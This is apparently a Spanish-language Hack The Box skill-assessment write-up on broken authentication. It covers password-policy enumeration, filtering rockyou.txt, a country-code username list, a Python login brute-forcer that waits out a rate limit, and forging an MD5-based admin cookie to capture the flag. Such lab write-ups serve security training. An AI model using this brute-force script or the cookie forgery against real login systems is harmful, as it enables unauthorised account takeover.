# HTB skill assesment

## PISTA DE ENUMERACION DE USUARIOS

La pagina de support nos da una pista:

![[Pasted image 20230120223958.png]]

parece que se tenia muchas cuentas llamadas **support** por pais y se las unifico en una cuenta central llamada **support** pero las cuentas anteriores siguen habilitadas, ademas la sintaxis parece ser **support+(country code)**

## ENUMERACION DE LA POLITICA DE CONTRASEÑA

en el apartado de login vamos a crearnos una cuenta, aqui podremos enumerar la politica de contraseña jugando al setear nuestra password:

primero coloco una **a** como contraseña y me muestra que **la contraseña tiene que comenzar con una letra capital (mayuscula)**:

![[Pasted image 20230120224459.png]]

despues coloco **Aa** y me dice que **la contraseña debe acabar en un digito**:

![[Pasted image 20230120224545.png]]

despues coloco **Aa1** y me dice **que la contraseña debe tener un caracter especial**:

![[Pasted image 20230120224652.png]]

entonces coloco **Aa$1** y me dice **la contraseña es mas corta que 20 caracteres** entonces se que tiene que tener al menos 20 caracteres.

![[Pasted image 20230120224810.png]]

entonces coloco **Aabbbbbbbbbbbbbbbb$1** y puedo registrar mi usuario:

![[Pasted image 20230120224912.png]]

el ejercicio nos recomienda usar **rockyou.txt** como diccionario, vamos a filtrarlo en base a la politica de contraseña:

- password policy
	- Capital word
	- end with a digit
	- special character
	- one lower at least
	- minimun 20 characters

```bash
grep '^[[:upper:]]' /usr/share/wordlists/rockyou.txt | grep '[[:digit:]]$' | grep '[[:punct:]]'  | grep '[[:lower:]]' | grep -E '^.{20,}$' | tee pass.txt
```

## ENUMERACION DE USUARIOS

una vez iniciada sesion con el usuario creado, en el apardo de **message**, nos permite enviar un mensaje a un usuario, podemos realizar fuerza bruta con burpsuite y enumerar usuarios a traves del mensaje de respuesta:

![[Pasted image 20230120225417.png]]

segun la pista de los nombres de usuario, se creo el siguiente diccionario:

```bash
support.af
support.ax
support.al
support.dz
support.as
support.ad
support.ao
support.ai
support.aq
support.ag
support.ar
support.am
support.aw
support.au
support.at
support.az
support.bh
support.bs
support.bd
support.bb
support.by
support.be
support.bz
support.bj
support.bm
support.bt
support.bo
support.bq
support.ba
support.bw
support.bv
support.br
support.io
support.bn
support.bg
support.bf
support.bi
support.kh
support.cm
support.ca
support.cv
support.ky
support.cf
support.td
support.cl
support.cn
support.cx
support.cc
support.co
support.km
support.cg
support.cd
support.ck
support.cr
support.ci
support.hr
support.cu
support.cw
support.cy
support.cz
support.dk
support.dj
support.dm
support.do
support.ec
support.eg
support.sv
support.gq
support.er
support.ee
support.et
support.fk
support.fo
support.fj
support.fi
support.fr
support.gf
support.pf
support.tf
support.ga
support.gm
support.ge
support.de
support.gh
support.gi
support.gr
support.gl
support.gd
support.gp
support.gu
support.gt
support.gg
support.gn
support.gw
support.gy
support.ht
support.hm
support.va
support.hn
support.hk
support.hu
support.is
support.in
support.id
support.ir
support.iq
support.ie
support.im
support.il
support.it
support.jm
support.jp
support.je
support.jo
support.kz
support.ke
support.ki
support.kp
support.kr
support.kw
support.kg
support.la
support.lv
support.lb
support.ls
support.lr
support.ly
support.li
support.lt
support.lu
support.mo
support.mk
support.mg
support.mw
support.my
support.mv
support.ml
support.mt
support.mh
support.mq
support.mr
support.mu
support.yt
support.mx
support.fm
support.md
support.mc
support.mn
support.me
support.ms
support.ma
support.mz
support.mm
support.na
support.nr
support.np
support.nl
support.nc
support.nz
support.ni
support.ne
support.ng
support.nu
support.nf
support.mp
support.no
support.om
support.pk
support.pw
support.ps
support.pa
support.pg
support.py
support.pe
support.ph
support.pn
support.pl
support.pt
support.pr
support.qa
support.re
support.ro
support.ru
support.rw
support.bl
support.sh
support.kn
support.lc
support.mf
support.pm
support.vc
support.ws
support.sm
support.st
support.sa
support.sn
support.rs
support.sc
support.sl
support.sg
support.sx
support.sk
support.si
support.sb
support.so
support.za
support.gs
support.ss
support.es
support.lk
support.sd
support.sr
support.sj
support.sz
support.se
support.ch
support.sy
support.tw
support.tj
support.tz
support.th
support.tl
support.tg
support.tk
support.to
support.tt
support.tn
support.tr
support.tm
support.tc
support.tv
support.ug
support.ua
support.ae
support.gb
support.us
support.um
support.uy
support.uz
support.vu
support.ve
support.vn
support.vg
support.vi
support.wf
support.eh
support.ye
support.zm
support.zw
```

Fuente: [https://datahub.io/core/country-list](https://datahub.io/core/country-list)

y se tiene los siguientes usuarios validos:

![[Pasted image 20230120225558.png]]

## ATAQUE DE FUERZA BRUTA LOGIN

Ya tenemos usuarios validos y filtramos el diccionario rockyou segun la politica de conrtaseñas, el login tiene una proteccion de **rate limit** de 30 segundos no incremental, usaremos el siguiente script para realizar el ataque:

```bash
import requests
import time

#colors
HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKCYAN = '\033[96m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

# file that contain user:pass
userpass_file = "userpass.txt"

# create url using user and password as argument
url = "http://138.68.167.82:30771/login.php"

# rate limit blocks for 30 seconds
lock_time = 30

# message that alert us we hit rate limit
lock_message = "Too many login failures"

# read user and password
with open(userpass_file, "r") as fh:
    for fline in fh:
        # skip comment
        fline = fline.rstrip()
        if fline.startswith("#"):
            continue

        # take username
        username = fline.split(":")[0]

        # take password, join to keep password that contain a :
        password = ":".join(fline.split(":")[1:])

        # prepare POST data
        data = {
            "userid": username,
            "passwd": password,
            "submit": "submit"
        }

        # do the request
        res = requests.post(url, data=data)

        # handle generic credential error
        if "Invalid credentials" in res.text:
            print("{}[-] Invalid credentials: userid:{} passwd:{}{}".format(OKCYAN,username, password, ENDC))
        # user and password were valid !
        elif "Welcome" in res.text:
            print("{}[+] Valid credentials: userid:{} passwd:{}{}".format(OKGREEN,username, password,ENDC))
        # hit rate limit, let's say we have to wait 30 seconds
        elif lock_message in res.text:
            print(f"{WARNING}[-] Hit rate limit, sleeping 30{ENDC}")
            # do the actual sleep plus 0.5 to be sure
            time.sleep(lock_time+0.5)

```

![[Pasted image 20230120225822.png]]

se hallaron las siguientes credenciales validas:

- users:
	- support
	- guest 
	- support.us - Mustang#firebird1995
	- support.it - Mustang#firebird1995
	- support.cn - BisocaBuzau#20061985
	- support.gr - Situngkir766H!011104

## ENUMERACION DE USUARIOS 2

vamos a ver, con la misma forma de los usuarios **support** si encontramos mas usuarios con esa nomenclatura, se usara la lista de codigos de paises y esta lista de nombres de usuario:

- [https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)

y con el siguiente script se haran las permutaciones:

```bash
import itertools
import numpy

# file that contain country codes
userpass_file = "count.txt"

# file that contain user:pass
userpass_file1 = "top-usernames-shortlist.txt"

output = []

with open(userpass_file1, "r") as fh1:
    for fline1 in fh1:
        with open(userpass_file, "r") as fh:
            for fline in fh:

                fline = fline.strip()
                concatUser = fline1.strip() +"."+ fline.strip()
                output.append(concatUser)

    output = numpy.array(output)
    print(output)

    with open("shortlist_permutation_country_codes.txt", "w") as outfile:
        outfile.write("\n".join(output))
```

enumeramos en la secciones de **message** con intruder y encontramos 4 usuarios mas:

![[Pasted image 20230121001150.png]]

## COOKIE TAMPERING

iniciemos sesion con el usuario **support.us - Mustang#firebird1995**:

![[Pasted image 20230121001336.png]]

nos genera el siguiente token de acceso:

```bash
YWY2MTcyZGExZjM1M2E5YjliYmJhYWMzYWMxZWQ0YzQ6NDM0OTkwYzhhMjVkMmJlOTQ4NjM1NjFhZTk4YmQ2ODI%3D
```

con la ayuda de **cyberchef** descubrimos lo siguiente:

![[Pasted image 20230121001501.png]]

parece estar usuando un cifrado **MD5:MD5**, verificamos con [https://crackstation.net/](https://crackstation.net/):

![[Pasted image 20230121001637.png]]

El primer valor no lo identifica pero parece ser **username:rol**:

![[Pasted image 20230121001751.png]]

vamos a crear una cookie con el siguiente valor **admin.us:admin**:

>[!note]
>Despues de muchos intentos este funciono.

```bash
# md5(admin.us):md5(admin)
5e2dea20edeb5de788969bd9d441aaa9:21232f297a57a5a743894a0e4a801fc3
```

![[Pasted image 20230121002019.png]]

realizamos el cookie tampering y reenviamos la peticion.

![[Pasted image 20230121002125.png]]

Asi obtenemos la flag final.




